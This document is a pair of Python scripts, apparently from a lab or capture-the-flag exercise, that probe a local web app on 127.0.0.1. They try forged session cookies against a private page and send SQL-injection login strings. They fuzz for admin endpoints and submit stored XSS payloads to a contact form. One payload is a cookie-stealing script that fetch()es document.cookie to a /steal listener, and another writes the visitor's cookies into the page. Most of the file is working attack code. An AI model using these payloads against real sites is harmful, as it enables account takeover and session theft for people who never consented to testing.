import requests
import re

target = "http://127.0.0.1:33001"

print("=" * 60)
print("CHECKING ABOUT PAGE AND TESTING AUTHENTICATED ACCESS")
print("=" * 60)

# Check about.php full content
print("\n[1] Full /about.php content")
resp = requests.get(f"{target}/about.php", timeout=10)
print(f"Status: {resp.status_code} | Length: {len(resp.text)}")
print("Content:")
print(resp.text)

# Look for any admin references
if "admin" in resp.text.lower():
    print("\n[!] Found 'admin' reference in about.php")
if "message" in resp.text.lower():
    print("\n[!] Found 'message' reference in about.php")

# Check if home.php redirects or has content
print("\n[2] Following /home.php redirect")
resp = requests.get(f"{target}/home.php", timeout=10, allow_redirects=True)
print(f"Final URL: {resp.url}")
print(f"Status: {resp.status_code}")
print(f"Redirect history: {[r.status_code for r in resp.history]}")

# Try common admin session values on /private.php  
print("\n[3] Testing session cookie values on /private.php")
test_sessions = [
    ("PHPSESSID", "admin123"),
    ("PHPSESSID", "1"),
    ("session", "admin"),
    ("auth", "true"),
    ("logged_in", "1"),
    ("user", "admin"),
    ("admin", "true")
]

for name, value in test_sessions:
    cookies = {name: value}
    resp = requests.get(f"{target}/private.php", cookies=cookies, timeout=5)
    # Check if response changes
    if "Private Zone" in resp.text and len(resp.text) < 800:
        pass  # Still unauthenticated view
    else:
        print(f"  [!] Different response with {name}={value}")
        print(f"      Status: {resp.status_code} | Length: {len(resp.text)}")
        print(f"      Preview: {resp.text[:300]}")

# Try POST login with various credentials to see error messages
print("\n[4] Testing login for error messages")
test_creds = [
    ("admin", "admin"),
    ("admin',--", "password"),
    ("' OR '1'='1", "password"),
]

for user, pwd in test_creds:
    resp = requests.post(f"{target}/login.php", data={
        "username": user,
        "password": pwd
    }, timeout=5)
    content = resp.text.lower()
    print(f"  [{user}/{pwd}]: HTTP {resp.status_code}, len={len(resp.text)}")
    if "invalid" in content:
        print(f"      -> Invalid credentials message")
    elif "welcome" in content or "dashboard" in content or "admin" in content:
        print(f"      [!] Possible success!")
        print(f"      {resp.text[:500]}")
    elif resp.status_code == 302:
        print(f"      [!] Redirect detected: {resp.headers.get('Location', 'n/a')}")

# Submit a REAL session stealing XSS payload
print("\n[5] Submit real session-stealing XSS payload")
# Using fetch to send cookie to a listener
xss_payload = "<script>fetch('http://127.0.0.1:33001/steal?c='+document.cookie)</script>"
resp = requests.post(f"{target}/contact.php", data={
    "name": "Admin",
    "email": "admin@test.com", 
    "message": xss_payload
}, timeout=10)
print(f"Payload submitted: {xss_payload}")
print(f"Response: {resp.status_code} - {resp.text[:300]}")

# Summary of all discovered endpoints
print("\n" + "=" * 60)
print("ENDPOINT INVENTORY")
print("=" * 60)
endpoints = ["/home.php", "/about.php", "/contact.php", "/login.php", "/private.php"]
for ep in endpoints:
    resp = requests.get(f"{target}{ep}", timeout=5, allow_redirects=True)
    print(f"  {ep:20} -> HTTP {resp.status_code} ({len(resp.content)} bytes)")
    
print("\nNOTE: /admin/index.php returns 404 - endpoint does NOT exist")
print("Stored XSS payload is submitted, but triggering location is unknown")

import requests
import re

target = "http://127.0.0.1:33001"

print("=" * 60)
print("FINAL DISCOVERY CHECK")
print("=" * 60)

# Check index.php
print("\n[1] Check /index.php")
resp = requests.get(f"{target}/index.php", timeout=10)
print(f"Status: {resp.status_code}")
print(f"Full content ({len(resp.text)} chars):")
print(resp.text)

# Now let's fuzz for admin endpoints
print("\n[2] Fuzzing for admin/message endpoints")
possible_endpoints = [
    "/admin",
    "/admin/",
    "/admin.php", 
    "/messages",
    "/messages.php",
    "/view",
    "/view.php",
    "/inbox",
    "/inbox.php",
    "/dashboard",
    "/dashboard.php",
    "/panel",
    "/panel.php"
]

found = []
for endpoint in possible_endpoints:
    try:
        resp = requests.get(f"{target}{endpoint}", timeout=5, allow_redirects=False)
        if resp.status_code != 404:
            print(f"  [!] {endpoint:20} -> HTTP {resp.status_code} ({len(resp.content)} bytes)")
            found.append((endpoint, resp.status_code))
    except:
        pass

if not found:
    print("  No additional endpoints found (all return 404)")

# Submit a DIFFERENT XSS payload - one that's more likely to work
# Use a blind XSS payload that exfiltrates to requestbin/httpbin style
print("\n[3] Submit payload that creates visible evidence")
# This payload will show visible output if executed
xss_payload = "<img src=x onerror='document.body.innerHTML=\"<h1>XSS_TRIGGERED_Cookie:\"+document.cookie+\"</h1>\"' />"
resp = requests.post(f"{target}/contact.php", data={
    "name": "XSS Test",
    "email": "test@example.com",
    "message": xss_payload
}, timeout=10)
print(f"Payload: {xss_payload}")
print(f"Submitted: HTTP {resp.status_code}")

# Final summary
print("\n" + "=" * 60)
print("FINAL SUMMARY")
print("=" * 60)
print("\nDiscovered Endpoints (exist and accessible):")
print("  - GET  /index.php     -> HTTP 200 (homepage)")
print("  - GET  /home.php      -> HTTP 302 -> /index.php")
print("  - GET  /about.php     -> HTTP 200")
print("  - GET  /contact.php   -> HTTP 200")
print("  - POST /contact.php   -> HTTP 200 (stores message)")
print("  - GET  /login.php     -> HTTP 200")
print("  - POST /login.php     -> HTTP 200 (no error disclosure)")
print("  - GET  /private.php   -> HTTP 200 (requires auth)")
print("")
print("Endpoints tested and NOT FOUND (404):")
print("  - /admin/index.php")
print("  - All common admin/message endpoints")
print("")
print("XSS Status:")
print("  - Stored XSS confirmed on POST /contact.php")
print("  - Payloads are stored but admin viewing endpoint unknown")
print("  - Private.php exists but requires authentication")

